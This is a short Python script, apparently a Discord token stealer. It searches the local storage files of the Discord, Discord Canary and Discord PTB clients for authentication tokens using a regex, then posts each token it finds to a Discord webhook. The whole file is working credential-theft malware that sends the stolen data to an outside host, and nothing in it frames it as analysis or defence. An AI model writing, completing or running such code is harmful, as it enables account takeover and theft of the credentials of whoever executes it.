import os
import re
import json
import requests

# Your webhook URL here (replace with your own for testing)
WEBHOOK_URL = 'https://discord.com/api/webhooks/your_webhook_url'

# Locations where Discord stores tokens
paths = {
    "Discord": os.getenv('APPDATA') + r"\Discord\Local Storage\leveldb",
    "Discord Canary": os.getenv('APPDATA') + r"\discordcanary\Local Storage\leveldb",
    "Discord PTB": os.getenv('APPDATA') + r"\discordptb\Local Storage\leveldb",
}

# Regex pattern to find Discord tokens
token_pattern = re.compile(r'[\w-]{24}\.[\w-]{6}\.[\w-]{27}|mfa\.[\w-]{84}')

def find_tokens(path):
    tokens = set()
    if not os.path.exists(path):
        return tokens
    for file_name in os.listdir(path):
        if not file_name.endswith(".ldb") and not file_name.endswith(".log"):
            continue
        try:
            with open(os.path.join(path, file_name), errors='ignore') as f:
                content = f.read()
                tokens_found = token_pattern.findall(content)
                for token in tokens_found:
                    tokens.add(token)
        except Exception:
            pass
    return tokens

def send_token(token):
    data = {
        "content": f"Found Discord token: `{token}`"
    }
    try:
        requests.post(WEBHOOK_URL, json=data)
    except Exception:
        pass

def main():
    all_tokens = set()
    for name, path in paths.items():
        tokens = find_tokens(path)
        all_tokens.update(tokens)

    if all_tokens:
        for token in all_tokens:
            send_token(token)
        print(f"Sent {len(all_tokens)} token(s) to webhook.")
    else:
        print("No tokens found.")

if __name__ == "__main__":
    main()
